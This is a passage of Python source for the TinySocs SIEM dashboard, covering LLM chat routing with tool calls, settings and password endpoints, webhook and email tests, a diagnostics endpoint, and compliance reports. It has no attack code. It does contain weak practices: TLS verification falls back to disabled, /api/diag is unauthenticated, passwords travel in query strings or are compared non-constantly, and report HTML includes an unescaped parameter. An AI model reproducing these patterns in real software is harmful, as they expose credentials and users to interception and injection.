        "    winlog.event_id, winlog.channel, winlog.computer_name, message\n"
        "  WRONG: computer_name:X    CORRECT: winlog.computer_name:X\n"
        "  WRONG: event_id:4625      CORRECT: winlog.event_id:4625\n\n"
        "- Time expressions: now-1d, now-7d, now-1h, now-30m.\n"
        "- Always use 'timestamp' for alerts, '@timestamp' for winlog.\n"
        "- Do not retry a tool if it already returned data (even if 0 results).\n\n"

        "QUERY STRATEGY:\n"
        "- For broad questions ('anything going on?', 'what's happening?', 'overview'):\n"
        "  search ALL alerts without filtering by hostname. Use: alert.severity:* or timestamp >= now-24h\n"
        "- Only filter by source.computer_name when the user asks about a SPECIFIC host.\n"
        "- NEVER invent or guess hostnames. Use ONLY the real hostnames listed below.\n"
        "- If the user says 'my environment', that means ALL monitored hosts — do not filter."
    )

    # Inject live environment context (known hosts, alert counts)
    env_context = _chat_get_environment_context()
    if env_context:
        system_text += (
            "\n\nCURRENT ENVIRONMENT STATE:\n"
            + env_context
        )

    # Get or create session (trim to last 20 messages to control context size)
    if session_id not in _chat_sessions:
        _chat_sessions[session_id] = []
    messages = _chat_sessions[session_id]
    if len(messages) > 20:
        _chat_sessions[session_id] = messages[-20:]
        messages = _chat_sessions[session_id]

    # Route to the appropriate LLM backend (use dashboard-local tool dispatcher)
    if llm_mode in ("anthropic", "claude"):
        result = _chat_anthropic(user_message, session_id, messages, system_text, _chat_call_tool_masked)
    elif llm_mode == "openai":
        result = _chat_openai(user_message, session_id, messages, system_text, _chat_call_tool_masked)
    elif llm_mode == "ollama":
        result = _chat_ollama(user_message, session_id, messages, system_text)
    else:
        # Offline / disabled — graceful message
        messages.append({"role": "user", "content": user_message})
        reply = (
            "The AI assistant is not currently configured. "
            "To enable it, open Settings (gear icon) and set an LLM provider:\n\n"
            "- OpenAI: set LLM_MODE to 'openai' and add your API key\n"
            "- Anthropic: set LLM_MODE to 'anthropic' and add your API key\n"
            "- Ollama: set LLM_MODE to 'ollama' (requires Ollama installed separately)\n\n"
            "All dashboard data panels work without AI."
        )
        messages.append({"role": "assistant", "content": reply})
        result = {"reply": reply, "session_id": session_id, "tool_calls": []}

    # Persist chat sessions to disk so conversations survive restarts
    _save_chat_sessions()
    return result


def _chat_anthropic(
    user_message: str,
    session_id: str,
    messages: List[Dict[str, Any]],
    system_text: str,
    call_tool,
) -> Dict[str, Any]:
    """Anthropic Claude chat with tool-calling."""
    try:
        import anthropic
    except ImportError as exc:
        return {"error": f"Chat unavailable (anthropic): {exc}", "session_id": session_id}

    _TOOLS = _CHAT_TOOLS_ANTHROPIC

    # Read API key and model fresh from env (use `or` so empty string falls back)
    api_key = os.getenv("ANTHROPIC_API_KEY", "")
    model = os.getenv("ANTHROPIC_MODEL", "").strip()
    if not model:
        return {
            "error": "No Anthropic model configured. Set ANTHROPIC_MODEL in Settings (e.g. claude-sonnet-4-20250514).",
            "session_id": session_id,
        }

    if not api_key:
        return {
            "error": "ANTHROPIC_API_KEY not set. Configure it in Settings (gear icon).",
            "session_id": session_id,
        }

    messages.append({"role": "user", "content": user_message})
    client = anthropic.Anthropic(api_key=api_key)
    tool_calls_made: List[Dict[str, Any]] = []

    try:
        for _round in range(6):  # max 3 tool rounds + 1 final
            response = client.messages.create(
                model=model,
                max_tokens=2048,
                system=system_text,
                messages=messages,
                tools=_TOOLS,
                temperature=0.2,
            )

            tool_uses = [b for b in response.content if b.type == "tool_use"]
            text_blocks = [b for b in response.content if b.type == "text"]

            if not tool_uses:
                assistant_text = "".join(b.text for b in text_blocks).strip()
                if not assistant_text:
                    assistant_text = "(No response from assistant)"
                messages.append({"role": "assistant", "content": assistant_text})
                return {
                    "reply": assistant_text,
                    "session_id": session_id,
                    "tool_calls": tool_calls_made,
                }

            messages.append({"role": "assistant", "content": response.content})

            tool_results = []
            for tu in tool_uses:
                result = call_tool(tu.name, tu.input)
                result_json = json.dumps(result)
                if len(result_json) > 8000:
                    result_json = result_json[:8000] + '..."}'
                tool_calls_made.append({
                    "tool": tu.name,
                    "input": tu.input,
                    "output_preview": result_json[:300],
                })
                tool_results.append({
                    "type": "tool_result",
                    "tool_use_id": tu.id,
                    "content": result_json,
                })

            messages.append({"role": "user", "content": tool_results})

        return {
            "reply": "I ran out of tool-call rounds. Try a more specific question.",
            "session_id": session_id,
            "tool_calls": tool_calls_made,
        }

    except Exception as exc:
        if messages and messages[-1].get("role") == "user":
            messages.pop()
        return {"error": f"Chat error: {type(exc).__name__}: {exc}", "session_id": session_id}


def _chat_openai(
    user_message: str,
    session_id: str,
    messages: List[Dict[str, Any]],
    system_text: str,
    call_tool,
) -> Dict[str, Any]:
    """OpenAI chat with tool-calling (using httpx like the summarizer)."""
    try:
        import httpx
    except ImportError as exc:
        return {"error": f"Chat unavailable (openai): {exc}", "session_id": session_id}

    _OAI_TOOLS = _CHAT_TOOLS_OPENAI

    # Read API key and model fresh from env (use `or` so empty string falls back)
    _OAI_KEY = os.getenv("OPENAI_API_KEY", "")
    _OAI_MODEL = os.getenv("OPENAI_MODEL", "").strip()
    if not _OAI_MODEL:
        return {
            "error": "No OpenAI model configured. Set OPENAI_MODEL in Settings (e.g. gpt-4o, gpt-4o-mini).",
            "session_id": session_id,
        }

    if not _OAI_KEY:
        return {
            "error": "OPENAI_API_KEY not set. Configure it in Settings (gear icon).",
            "session_id": session_id,
        }

    # OpenAI uses a different message format; maintain a parallel history
    # We store messages in Anthropic-like format in _chat_sessions but convert here
    oai_messages = [{"role": "system", "content": system_text}]
    # Convert existing session history to OpenAI format
    for m in messages:
        role = m.get("role", "user")
        content = m.get("content", "")
        if role in ("user", "assistant") and isinstance(content, str):
            oai_messages.append({"role": role, "content": content})
        # Skip tool_result messages from Anthropic format (they don't carry over between backends)

    oai_messages.append({"role": "user", "content": user_message})
    messages.append({"role": "user", "content": user_message})

    headers = {"Authorization": f"Bearer {_OAI_KEY}", "Content-Type": "application/json"}
    tool_calls_made: List[Dict[str, Any]] = []

    try:
        with httpx.Client(timeout=90) as http:
            for _round in range(6):
                body_req: Dict[str, Any] = {
                    "model": _OAI_MODEL,
                    "messages": oai_messages,
                    "tools": _OAI_TOOLS,
                    "tool_choice": "auto",
                    "temperature": 0.2,
                }

                resp = http.post(
                    "https://api.openai.com/v1/chat/completions",
                    json=body_req,
                    headers=headers,
                )
                if resp.status_code >= 400:
                    err_text = resp.text[:400]
                    if messages and messages[-1].get("role") == "user":
                        messages.pop()
                    return {
                        "error": f"OpenAI API error (HTTP {resp.status_code}): {err_text}",
                        "session_id": session_id,
                    }

                choice = resp.json()["choices"][0]["message"]
                oai_messages.append(choice)

                tool_calls = choice.get("tool_calls") or []
                if not tool_calls:
                    assistant_text = (choice.get("content") or "").strip()
                    if not assistant_text:
                        assistant_text = "(No response from assistant)"
                    messages.append({"role": "assistant", "content": assistant_text})
                    return {
                        "reply": assistant_text,
                        "session_id": session_id,
                        "tool_calls": tool_calls_made,
                    }

                # Execute tools
                for tc in tool_calls:
                    name = tc["function"]["name"]
                    try:
                        args = json.loads(tc["function"]["arguments"] or "{}")
                    except Exception:
                        args = {}
                    result = call_tool(name, args)
                    result_json = json.dumps(result)
                    if len(result_json) > 8000:
                        result_json = result_json[:8000] + '..."}'
                    tool_calls_made.append({
                        "tool": name,
                        "input": args,
                        "output_preview": result_json[:300],
                    })
                    oai_messages.append({
                        "role": "tool",
                        "tool_call_id": tc["id"],
                        "content": result_json,
                    })

            # Ran out of rounds
            messages.append({"role": "assistant", "content": "(Ran out of tool-call rounds)"})
            return {
                "reply": "I ran out of tool-call rounds. Try a more specific question.",
                "session_id": session_id,
                "tool_calls": tool_calls_made,
            }

    except Exception as exc:
        if messages and messages[-1].get("role") == "user":
            messages.pop()
        return {"error": f"Chat error: {type(exc).__name__}: {exc}", "session_id": session_id}


def _chat_ollama(
    user_message: str,
    session_id: str,
    messages: List[Dict[str, Any]],
    system_text: str,
) -> Dict[str, Any]:
    """Ollama chat (no tool-calling, simple request-response)."""
    try:
        import httpx
    except ImportError as exc:
        return {"error": f"Chat unavailable (ollama): {exc}", "session_id": session_id}

    ollama_url = os.getenv("OFFLINE_LLM_URL") or "http://localhost:11434"
    ollama_model = os.getenv("OFFLINE_LLM_MODEL") or "qwen2.5:0.5b-instruct"

    messages.append({"role": "user", "content": user_message})

    # Build a simple prompt from the conversation history
    prompt_parts = [system_text + "\n"]
    for m in messages:
        role = m.get("role", "user")
        content = m.get("content", "")
        if isinstance(content, str):
            prompt_parts.append(f"{role}: {content}")
    prompt = "\n".join(prompt_parts)
    # Trim to avoid overwhelming small models
    if len(prompt) > 8000:
        prompt = prompt[-8000:]

    try:
        with httpx.Client(timeout=120) as http:
            resp = http.post(
                f"{ollama_url.rstrip('/')}/api/generate",
                json={
                    "model": ollama_model,
                    "prompt": prompt,
                    "stream": False,
                    "options": {"temperature": 0.3, "num_predict": 512, "num_ctx": 2048},
                },
            )
            if resp.status_code >= 400:
                if messages and messages[-1].get("role") == "user":
                    messages.pop()
                return {
                    "error": f"Ollama error (HTTP {resp.status_code}): {resp.text[:300]}",
                    "session_id": session_id,
                }
            assistant_text = (resp.json().get("response") or "").strip()
            if not assistant_text:
                assistant_text = "(No response from Ollama)"
    except Exception as exc:
        if messages and messages[-1].get("role") == "user":
            messages.pop()
        err_str = str(exc)
        if "10061" in err_str or "ConnectionRefused" in err_str or "ConnectError" in type(exc).__name__:
            friendly = (
                f"Cannot connect to Ollama at {ollama_url}. "
                "Ollama is not bundled with TinySocs — install it from ollama.com, "
                "start the service, then try again. Or switch to OpenAI/Anthropic in Settings."
            )
        else:
            friendly = f"Ollama error: {type(exc).__name__}: {err_str}"
        return {"error": friendly, "session_id": session_id}

    messages.append({"role": "assistant", "content": assistant_text})
    return {"reply": assistant_text, "session_id": session_id, "tool_calls": []}


# ---------------------------------------------------------------------------
# Settings API (read/write assistant.env, protected by admin password)
# Uses _get_admin_password() defined above (M0 auth section).
# ---------------------------------------------------------------------------

# Settings that the dashboard can read/write
_SETTINGS_KEYS = [
    "LLM_MODE", "OPENAI_API_KEY", "OPENAI_MODEL",
    "ANTHROPIC_API_KEY", "ANTHROPIC_MODEL",
    "OFFLINE_LLM_URL", "OFFLINE_LLM_MODEL",
    "SIEM_URL", "SIEM_USER", "SIEM_PASS",
    "SIEM_SSL_VERIFY", "SIEM_CA_CERT",
    "WEBHOOK_URL", "WEBHOOK_ENABLED",
    "NOTIFY_SLACK", "SLACK_WEBHOOK_URL",
    "ABUSEIPDB_API_KEY", "OTX_API_KEY", "GREYNOISE_API_KEY",
    "WINLOG_RETENTION_DAYS", "ALERT_RETENTION_DAYS",
]

# Keys whose values should be masked in GET responses
_SECRET_KEYS = {
    "OPENAI_API_KEY", "ANTHROPIC_API_KEY", "SIEM_PASS",
    "ABUSEIPDB_API_KEY", "OTX_API_KEY", "GREYNOISE_API_KEY",
}


def _find_assistant_env() -> Optional[Path]:
    """Locate the assistant.env file."""
    candidates = [
        Path(os.getenv("ProgramData", "C:\\ProgramData")) / "TinySocs" / "Assistant" / "assistant.env",
        Path(os.getenv("ProgramFiles", "C:\\Program Files")) / "TinySocs" / "Assistant" / "assistant.env",
        Path("/var/lib/tinysocs/assistant.env"),
    ]
    for p in candidates:
        if p.is_file():
            return p
    return None


def _read_env_file(path: Path) -> Dict[str, str]:
    """Parse a .env file into a dict."""
    result: Dict[str, str] = {}
    try:
        for line in path.read_text(encoding="utf-8", errors="ignore").splitlines():
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            k, _, v = line.partition("=")
            result[k.strip()] = v.strip().strip('"').strip("'")
    except Exception:
        pass
    return result


def _write_env_file(path: Path, updates: Dict[str, str]) -> None:
    """Update specific keys in an .env file, preserving comments and order."""
    lines = []
    seen_keys: set = set()
    try:
        existing = path.read_text(encoding="utf-8", errors="ignore").splitlines()
    except Exception:
        existing = []

    for line in existing:
        stripped = line.strip()
        if stripped and not stripped.startswith("#") and "=" in stripped:
            k, _, _ = stripped.partition("=")
            k = k.strip()
            if k in updates:
                lines.append(f"{k}={updates[k]}")
                seen_keys.add(k)
                continue
        lines.append(line)

    # Append any new keys not already in the file
    for k, v in updates.items():
        if k not in seen_keys:
            lines.append(f"{k}={v}")

    path.write_text("\n".join(lines) + "\n", encoding="utf-8")


# ---------------------------------------------------------------------------
# agent-config.yml helpers (email/webhook notification settings for the C# agent)
# ---------------------------------------------------------------------------
def _find_agent_config() -> Optional[Path]:
    """Locate the agent-config.yml file used by the C# collector agent."""
    candidates = [
        Path(os.getenv("ProgramData", "C:\\ProgramData")) / "TinySocs" / "Collector" / "agent-config.yml",
        Path(os.getenv("ProgramFiles", "C:\\Program Files")) / "TinySocs" / "Collector" / "agent-config.yml",
        Path("/var/lib/tinysocs/agent-config.yml"),  # Linux fallback
    ]
    for p in candidates:
        if p.is_file():
            return p
    return None


def _read_agent_config() -> dict:
    """Read and parse agent-config.yml. Returns empty dict on failure."""
    import yaml
    p = _find_agent_config()
    if not p:
        return {}
    try:
        return yaml.safe_load(p.read_text(encoding="utf-8", errors="ignore")) or {}
    except Exception:
        return {}


def _write_agent_config(data: dict) -> None:
    """Write agent-config.yml back to disk, preserving structure."""
    import yaml
    p = _find_agent_config()
    if not p:
        return
    p.write_text(yaml.dump(data, default_flow_style=False, sort_keys=False), encoding="utf-8")


def _get_notification_config() -> dict:
    """Read the detection.notification section from agent-config.yml."""
    cfg = _read_agent_config()
    return cfg.get("detection", {}).get("notification", {})


def _set_notification_config(updates: dict) -> None:
    """Update the detection.notification section in agent-config.yml."""
    cfg = _read_agent_config()
    if not cfg:
        return
    detection = cfg.setdefault("detection", {})
    notification = detection.setdefault("notification", {})
    notification.update(updates)
    _write_agent_config(cfg)


@dashboard_app.get("/api/settings/notifications")
def api_notification_settings_get(admin_password: str = Query("")):
    """Read current notification settings (webhook + email) from agent-config.yml."""
    current_pw = _get_admin_password()
    if not current_pw:
        return JSONResponse(status_code=403, content={"error": "password_not_set"})
    if admin_password != current_pw:
        return JSONResponse(status_code=401, content={"error": "Invalid admin password"})

    notif = _get_notification_config()
    email = notif.get("email", {})
    return {
        "webhook_url": notif.get("webhook_url", ""),
        "email_smtp_host": email.get("smtp_host", ""),
        "email_smtp_port": email.get("smtp_port", 587),
        "email_from": email.get("from", ""),
        "email_to": email.get("to", ""),
        "agent_config_found": _find_agent_config() is not None,
    }


@dashboard_app.post("/api/settings/notifications")
def api_notification_settings_post(body: Dict[str, Any] = Body(...)):
    """Update notification settings in agent-config.yml."""
    admin_password = body.get("admin_password", "")
    current_pw = _get_admin_password()
    if not current_pw:
        return JSONResponse(status_code=403, content={"error": "password_not_set"})
    if admin_password != current_pw:
        return JSONResponse(status_code=401, content={"error": "Invalid admin password"})

    settings = body.get("settings", {})
    if not isinstance(settings, dict):
        return JSONResponse(status_code=400, content={"error": "settings must be a dict"})

    # Build the notification update
    updates: Dict[str, Any] = {}
    if "webhook_url" in settings:
        updates["webhook_url"] = str(settings["webhook_url"]).strip()
    email_updates = {}
    for field, key in [("email_smtp_host", "smtp_host"), ("email_smtp_port", "smtp_port"),
                       ("email_from", "from"), ("email_to", "to")]:
        if field in settings:
            val = settings[field]
            if key == "smtp_port":
                try:
                    val = int(val)
                except (ValueError, TypeError):
                    val = 587
            else:
                val = str(val).strip()
            email_updates[key] = val
    if email_updates:
        updates["email"] = email_updates

    if not updates:
        return {"ok": True, "message": "No changes to apply."}

    # If we're only updating email sub-keys, merge with existing email config
    if "email" in updates:
        existing = _get_notification_config().get("email", {})
        existing.update(updates["email"])
        updates["email"] = existing

    try:
        _set_notification_config(updates)
    except Exception as exc:
        return JSONResponse(status_code=500, content={"error": f"Failed to write agent-config.yml: {exc}"})

    # Also sync webhook URL to assistant.env (Python-side notifications)
    if "webhook_url" in updates:
        env_path = _find_assistant_env()
        if env_path:
            try:
                _write_env_file(env_path, {"WEBHOOK_URL": updates["webhook_url"]})
                os.environ["WEBHOOK_URL"] = updates["webhook_url"]
            except Exception:
                pass  # Non-fatal; agent-config.yml is the primary source

    return {
        "ok": True,
        "message": "Notification settings saved. C# agent will reload within 60 seconds.",
    }


@dashboard_app.post("/api/settings/test-webhook")
def api_test_webhook(body: Dict[str, Any] = Body(...)):
    """Send a test payload to the configured webhook URL."""
    import requests as _req

    # Accept session token (M0) or legacy admin_password
    admin_password = body.get("admin_password", "")
    if not _validate_session(admin_password):
        current_pw = _get_admin_password()
        if not current_pw:
            return JSONResponse(status_code=403, content={"error": "password_not_set"})
        if admin_password != current_pw:
            return JSONResponse(status_code=401, content={"error": "Invalid admin password"})

    # Use URL from body (if testing a new URL before saving) or from config
    url = body.get("webhook_url", "").strip()
    if not url:
        notif = _get_notification_config()
        url = notif.get("webhook_url", "")
    if not url:
        # Also check assistant.env
        url = os.getenv("WEBHOOK_URL", "").strip()
    if not url:
        return JSONResponse(status_code=400, content={"error": "No webhook URL configured."})

    payload = {"text": "[TinySocs] Test notification — webhook delivery verified."}
    # Use certifi CA bundle if available (handles Windows PyInstaller SSL cert store gaps).
    # Fall back to verify=False so the test is never blocked by local cert issues.
    try:
        import certifi as _certifi
        _ssl_verify: Any = _certifi.where()
    except ImportError:
        _ssl_verify = False
    try:
        resp = _req.post(url, json=payload, timeout=10, verify=_ssl_verify)
        if 200 <= resp.status_code < 300:
            return {"ok": True, "message": f"Webhook test successful (HTTP {resp.status_code})."}
        else:
            return JSONResponse(status_code=502, content={
                "error": f"Webhook returned HTTP {resp.status_code}: {resp.text[:200]}"
            })
    except _req.exceptions.Timeout:
        return JSONResponse(status_code=504, content={"error": "Webhook request timed out (10s)."})
    except _req.exceptions.ConnectionError as exc:
        return JSONResponse(status_code=502, content={"error": f"Connection failed: {exc}"})
    except Exception as exc:
        return JSONResponse(status_code=500, content={"error": f"Unexpected error: {exc}"})


@dashboard_app.post("/api/settings/test-email")
def api_test_email(body: Dict[str, Any] = Body(...)):
    """Send a test email via the configured SMTP settings."""
    import smtplib
    from email.mime.text import MIMEText

    # Accept session token (M0) or legacy admin_password
    admin_password = body.get("admin_password", "")
    if not _validate_session(admin_password):
        current_pw = _get_admin_password()
        if not current_pw:
            return JSONResponse(status_code=403, content={"error": "password_not_set"})
        if admin_password != current_pw:
            return JSONResponse(status_code=401, content={"error": "Invalid admin password"})

    # Use values from body (for testing before save) or from agent-config.yml
    smtp_host = body.get("smtp_host", "").strip()
    smtp_port = body.get("smtp_port", 0)
    email_from = body.get("email_from", "").strip()
    email_to = body.get("email_to", "").strip()

    if not smtp_host or not email_from or not email_to:
        notif = _get_notification_config()
        email_cfg = notif.get("email", {})
        smtp_host = smtp_host or email_cfg.get("smtp_host", "")
        smtp_port = smtp_port or email_cfg.get("smtp_port", 587)
        email_from = email_from or email_cfg.get("from", "")
        email_to = email_to or email_cfg.get("to", "")

    try:
        smtp_port = int(smtp_port) if smtp_port else 587
    except (ValueError, TypeError):
        smtp_port = 587

    if not smtp_host:
        return JSONResponse(status_code=400, content={"error": "SMTP host not configured."})
    if not email_from or not email_to:
        return JSONResponse(status_code=400, content={"error": "Email from/to address not configured."})

    msg = MIMEText(
        "<h2>TinySocs Email Test</h2>"
        "<p>This is a test email from the TinySocs dashboard.</p>"
        "<p>If you received this, your email notification configuration is working correctly.</p>",
        "html",
    )
    msg["Subject"] = "[TinySocs] Test Email \u2014 Configuration Verified"
    msg["From"] = email_from
    msg["To"] = email_to

    # Build SSL context using certifi CA bundle if available (handles Windows PyInstaller gaps).
    import ssl as _ssl
    try:
        import certifi as _certifi
        _ssl_ctx = _ssl.create_default_context(cafile=_certifi.where())
    except ImportError:
        _ssl_ctx = _ssl.create_default_context()
        _ssl_ctx.check_hostname = False
        _ssl_ctx.verify_mode = _ssl.CERT_NONE

    try:
        server = smtplib.SMTP(smtp_host, smtp_port, timeout=10)
        try:
            server.ehlo()
            if smtp_port in (587, 465):
                try:
                    server.starttls(context=_ssl_ctx)
                    server.ehlo()
                except smtplib.SMTPNotSupportedError:
                    pass  # Server doesn't support STARTTLS, continue unencrypted
            server.sendmail(email_from, [email_to], msg.as_string())
            return {"ok": True, "message": f"Test email sent to {email_to}."}
        finally:
            try:
                server.quit()
            except Exception:
                pass
    except smtplib.SMTPAuthenticationError as exc:
        return JSONResponse(status_code=502, content={"error": f"SMTP authentication failed: {exc}"})
    except smtplib.SMTPConnectError as exc:
        return JSONResponse(status_code=502, content={"error": f"SMTP connection failed: {exc}"})
    except (ConnectionRefusedError, OSError) as exc:
        return JSONResponse(status_code=502, content={"error": f"Connection refused: {smtp_host}:{smtp_port} — {exc}"})
    except smtplib.SMTPException as exc:
        return JSONResponse(status_code=502, content={"error": f"SMTP error: {exc}"})
    except Exception as exc:
        return JSONResponse(status_code=500, content={"error": f"Unexpected error: {exc}"})


@dashboard_app.get("/api/settings")
def api_settings_get(admin_password: str = Query(""), authorization: str = Header("")):
    """Read current settings from assistant.env. Secrets are masked."""
    # Accept session token (M0) or legacy admin_password
    token = authorization.replace("Bearer ", "") if authorization.startswith("Bearer ") else ""
    if not _validate_session(token):
        current_pw = _get_admin_password()
        if not current_pw:
            return JSONResponse(status_code=403, content={"error": "password_not_set"})
        if not hmac.compare_digest(admin_password, current_pw):
            return JSONResponse(status_code=401, content={"error": "Invalid admin password"})

    env_path = _find_assistant_env()
    file_values: Dict[str, str] = {}
    if env_path:
        file_values = _read_env_file(env_path)

    settings: Dict[str, Any] = {}
    for key in _SETTINGS_KEYS:
        # Prefer live env var (may differ from file if service hasn't restarted)
        val = os.getenv(key, file_values.get(key, ""))
        if key in _SECRET_KEYS and val:
            # Mask all but last 4 chars
            settings[key] = ("*" * max(0, len(val) - 4)) + val[-4:] if len(val) > 4 else "****"
        else:
            settings[key] = val

    return {
        "settings": settings,
        "env_file": str(env_path) if env_path else None,
        "llm_mode_active": os.getenv("LLM_MODE", "openai").strip().lower(),
    }


@dashboard_app.post("/api/settings")
def api_settings_post(body: Dict[str, Any] = Body(...)):
    """Update settings in assistant.env and live environment."""
    # Accept session token (M0) or legacy admin_password
    token = body.get("token", "")
    if not _validate_session(token):
        admin_password = body.get("admin_password", "")
        current_pw = _get_admin_password()
        if not current_pw:
            return JSONResponse(status_code=403, content={"error": "password_not_set"})
        if not hmac.compare_digest(admin_password, current_pw):
            return JSONResponse(status_code=401, content={"error": "Invalid admin password"})

    updates = body.get("settings", {})
    if not isinstance(updates, dict):
        return JSONResponse(status_code=400, content={"error": "settings must be a dict"})

    # Filter to allowed keys only, skip masked/unchanged secrets
    filtered: Dict[str, str] = {}
    for k, v in updates.items():
        if k not in _SETTINGS_KEYS:
            continue
        v = str(v).strip()
        # Skip if it's a masked value (all asterisks with last 4 chars)
        if k in _SECRET_KEYS and v and "*" in v:
            continue
        filtered[k] = v

    if not filtered:
        return {"ok": True, "message": "No changes to apply", "updated": []}

    # Write to file
    env_path = _find_assistant_env()
    if env_path:
        try:
            _write_env_file(env_path, filtered)
        except Exception as exc:
            return JSONResponse(status_code=500, content={"error": f"Failed to write env file: {exc}"})

    # Apply to live environment
    for k, v in filtered.items():
        os.environ[k] = v

    # Clear CA cert cache if SIEM settings changed
    if any(k.startswith("SIEM_") for k in filtered):
        import tinysocs.tls as _tls_mod
        _tls_mod._ca_pem_cache = None

    # Clear chat sessions if LLM settings changed (new provider = fresh context)
    if any(k.startswith(("LLM_", "OPENAI_", "ANTHROPIC_", "OFFLINE_")) for k in filtered):
        _chat_sessions.clear()
        _save_chat_sessions()

    return {
        "ok": True,
        "message": f"Updated {len(filtered)} setting(s). Restart service for full effect.",
        "updated": list(filtered.keys()),
        "restart_needed": True,
    }


@dashboard_app.get("/api/settings/password-status")
def api_password_status():
    """Check whether a dashboard password has been configured."""
    pw = _get_admin_password()
    return {"configured": bool(pw)}


@dashboard_app.post("/api/settings/setup-password")
def api_setup_password(body: Dict[str, Any] = Body(...)):
    """First-time password setup. Only works when SIEM_PASS is empty/unset."""
    current_pw = _get_admin_password()
    if current_pw:
        return JSONResponse(status_code=400, content={"error": "Password already configured. Use Change Password instead."})

    new_password = body.get("new_password", "").strip()
    if len(new_password) < 8:
        return JSONResponse(status_code=400, content={"error": "Password must be at least 8 characters."})

    # Write to assistant.env and live env
    env_path = _find_assistant_env()
    if env_path:
        try:
            _write_env_file(env_path, {"SIEM_PASS": new_password})
        except Exception as exc:
            return JSONResponse(status_code=500, content={"error": f"Failed to write env file: {exc}"})
    os.environ["SIEM_PASS"] = new_password

    return {"ok": True, "message": "Password configured successfully."}


@dashboard_app.post("/api/settings/change-password")
def api_change_password(body: Dict[str, Any] = Body(...)):
    """Change the dashboard/SIEM password. Requires current password."""
    current_pw = _get_admin_password()
    if not current_pw:
        return JSONResponse(status_code=403, content={"error": "password_not_set"})

    old_password = body.get("old_password", "")
    if old_password != current_pw:
        return JSONResponse(status_code=401, content={"error": "Current password is incorrect."})

    new_password = body.get("new_password", "").strip()
    if len(new_password) < 8:
        return JSONResponse(status_code=400, content={"error": "New password must be at least 8 characters."})
    if new_password == old_password:
        return JSONResponse(status_code=400, content={"error": "New password must differ from current password."})

    # Write to assistant.env and live env
    env_path = _find_assistant_env()
    if env_path:
        try:
            _write_env_file(env_path, {"SIEM_PASS": new_password})
        except Exception as exc:
            return JSONResponse(status_code=500, content={"error": f"Failed to write env file: {exc}"})
    os.environ["SIEM_PASS"] = new_password

    return {"ok": True, "message": "Password changed successfully. SIEM password also updated."}


@dashboard_app.get("/api/diag")
def api_diag():
    """Diagnostic endpoint for troubleshooting SIEM connectivity."""
    import requests as _req

    ca = _resolve_ca_cert()
    url = os.getenv("SIEM_URL", "https://localhost:9201")
    user = os.getenv("SIEM_USER", "admin")
    passwd = os.getenv("SIEM_PASS", "")

    diag: Dict[str, Any] = {
        "siem_url": url,
        "siem_user": user,
        "siem_pass_set": bool(passwd and passwd != "admin"),
        "siem_ssl_verify": os.getenv("SIEM_SSL_VERIFY", ""),
        "siem_ca_cert_env": os.getenv("SIEM_CA_CERT", ""),
        "resolve_ca_cert_result": str(ca),
        "resolve_ca_cert_type": type(ca).__name__,
    }

    # Check if ca cert file exists and is readable
    if isinstance(ca, str) and ca:
        ca_path = Path(ca)
        diag["ca_cert_exists"] = ca_path.is_file()
        if ca_path.is_file():
            try:
                raw = ca_path.read_bytes()
                diag["ca_cert_size"] = len(raw)
                diag["ca_cert_starts_with"] = raw[:40].decode("ascii", errors="replace")
            except Exception as e:
                diag["ca_cert_read_error"] = str(e)

    # Try a direct request
    for verify_mode, label in [(ca, "with_ca"), (False, "no_verify")]:
        try:
            r = _req.get(f"{url}/_cluster/health", auth=(user, passwd), verify=verify_mode, timeout=10)
            diag[f"test_{label}"] = {"status": r.status_code, "body": r.text[:200]}
        except Exception as e:
            diag[f"test_{label}"] = {"error": f"{type(e).__name__}: {str(e)[:300]}"}

    return diag


# ---------------------------------------------------------------------------
# Compliance report endpoints (Phase 14 M4)
# ---------------------------------------------------------------------------
@dashboard_app.get("/api/compliance/frameworks")
def api_compliance_frameworks():
    """List available compliance frameworks."""
    try:
        from tinysocs.reporting.compliance_report import list_frameworks, load_framework
        names = list_frameworks()
        frameworks = []
        for name in names:
            fw = load_framework(name)
            frameworks.append({
                "id": name,
                "name": fw.get("name", name),
                "version": fw.get("version", ""),
                "description": fw.get("description", ""),
            })
        return {"ok": True, "frameworks": frameworks}
    except Exception as exc:
        return JSONResponse(status_code=500, content={"ok": False, "error": str(exc)})


@dashboard_app.get("/api/compliance/report")
async def api_compliance_report(
    framework: str = Query("nist_csf"),
    hours: int = Query(720, ge=1, le=8760),
):
    """Generate compliance report data as JSON."""
    if _DEMO_MODE:
        return _demo_compliance_report(framework, hours)
    try:
        from tinysocs.reporting.compliance_report import generate_compliance_report
        loop = asyncio.get_event_loop()
        report = await loop.run_in_executor(
            _os_executor, generate_compliance_report, framework, hours
        )
        return {"ok": True, **report}
    except FileNotFoundError as exc:
        return JSONResponse(status_code=404, content={"ok": False, "error": str(exc)})
    except Exception as exc:
        return JSONResponse(status_code=500, content={"ok": False, "error": str(exc)})


@dashboard_app.get("/api/compliance/report/html")
async def api_compliance_report_html(
    framework: str = Query("nist_csf"),
    hours: int = Query(720, ge=1, le=8760),
):
    """Generate and download compliance report as HTML."""
    if _DEMO_MODE:
        report = _demo_compliance_report(framework, hours)
        fw_label = {"nist_csf": "NIST_CSF_2.0", "hipaa": "HIPAA", "pci_dss": "PCI_DSS"}.get(framework, framework)
        controls = report.get("controls", [])
        rows = "".join(
            f'<tr><td>{c["id"]}</td><td>{c["name"]}</td><td>{c["status"]}</td>'
            f'<td>{c.get("mapped_rules", 0)}</td><td>{c.get("event_count", 0)}</td></tr>'
            for c in controls
        )
        ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
        html = (
            f'<!DOCTYPE html><html><head><meta charset="utf-8">'
            f'<title>TinySocs Compliance Report — {fw_label}</title>'
            f'<style>body{{font-family:system-ui,sans-serif;margin:40px;color:#1a1a2e;background:#f8f9fa}}'
            f'h1{{color:#2c3e50}}table{{border-collapse:collapse;width:100%;margin-top:20px}}'
            f'th,td{{border:1px solid #dee2e6;padding:8px 12px;text-align:left}}'
            f'th{{background:#2c3e50;color:#fff}}tr:nth-child(even){{background:#f1f3f5}}'
            f'.pass{{color:#27ae60;font-weight:600}}.partial{{color:#e67e22;font-weight:600}}'
            f'.fail{{color:#e74c3c;font-weight:600}}'
            f'</style></head><body>'
            f'<h1>TinySocs Compliance Report</h1>'
            f'<p><strong>Framework:</strong> {fw_label} &nbsp; <strong>Period:</strong> {hours}h &nbsp; '
            f'<strong>Generated:</strong> {ts} &nbsp; <em>(Demo Mode)</em></p>'
            f'<p><strong>Coverage:</strong> {report["summary"]["pass"]} pass, '
            f'{report["summary"]["partial"]} partial, {report["summary"]["fail"]} fail '
